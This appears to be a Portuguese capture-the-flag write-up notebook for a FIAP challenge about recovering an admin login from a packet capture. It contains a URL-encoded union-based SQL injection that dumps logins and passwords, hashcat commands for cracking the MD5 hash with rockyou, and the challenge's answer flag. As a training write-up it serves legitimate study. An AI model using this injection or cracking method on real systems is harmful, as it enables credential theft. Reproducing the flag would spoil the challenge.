@@ -1,0 +1,68 @@
+#!meta
+
+{"kernelInfo":{"defaultKernelName":"csharp","items":[{"aliases":[],"name":"csharp"},{"aliases":[],"languageName":"fsharp","name":"fsharp"}]}}
+
+#!markdown
+
+# Enunciado
+Qual é o usuário e senha para acesso ao painel administrativo?
+
+Responda FIAP{user_pass}
+    
+<img src="./images/Enunciado.png"/>
+
+#!markdown
+
+## Ferramentas
+
+### Polyglot .NET
+Polyglot .NET é uma extensão para o .NET Interactive que permite a execução de múltiplas linguagens de programação em um único notebook, como F#, C#, PowerShell, e outras. Ele é útil para criar notebooks interativos que podem combinar diferentes linguagens para análise de dados, scripts de automação, e mais.
+
+### .NET (F#, C#, PowerShell)
+- **F#**: Uma linguagem funcional de programação que roda na plataforma .NET. É conhecida por sua concisão e capacidade de lidar com problemas complexos de forma elegante.
+- **C#**: Uma linguagem de programação orientada a objetos desenvolvida pela Microsoft. É amplamente utilizada para desenvolvimento de aplicações desktop, web, e mobile.
+- **PowerShell**: Uma linguagem de script e shell de linha de comando desenvolvida pela Microsoft. É usada principalmente para automação de tarefas administrativas e gerenciamento de sistemas.
+
+### Visual Studio Code (VSCode)
+VSCode é um editor de código-fonte desenvolvido pela Microsoft. Ele suporta uma ampla gama de linguagens de programação e vem com recursos como depuração, controle de versão integrado, e extensões.
+
+### Kali Linux Ferramentas
+- **WireShark**
+- **TShark**
+
+Essas ferramentas são amplamente utilizadas em segurança da informação e análise forense para inspecionar, analisar e manipular arquivos binários e imagens.
+
+### Bash
+Bash (Bourne Again Shell) é um interpretador de comandos e linguagem de script para sistemas Unix e Linux. Ele é amplamente utilizado para automação de tarefas, gerenciamento de sistemas e execução de comandos em linha de comando.
+
+#!markdown
+
+## Base torica
+    
+- Criptografia 
+- Http
+
+#!pwsh
+
+wireshark ./artefato/pass.pcap
+
+#!fsharp
+
+open System
+open System.IO
+
+#!fsharp
+
+Uri.UnescapeDataString("http://zedascouves.org/cat.php?id=-1%20union%20select%201,concat(id,0x3a,login,0x3a,password),3,4%20from%20users")
+
+#!pwsh
+
+hashcat -m 0 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
+
+#!pwsh
+
+hashcat -m 0 --show hash.txt
+
+#!pwsh
+
+FIAP{admin_P4ssw0rd}
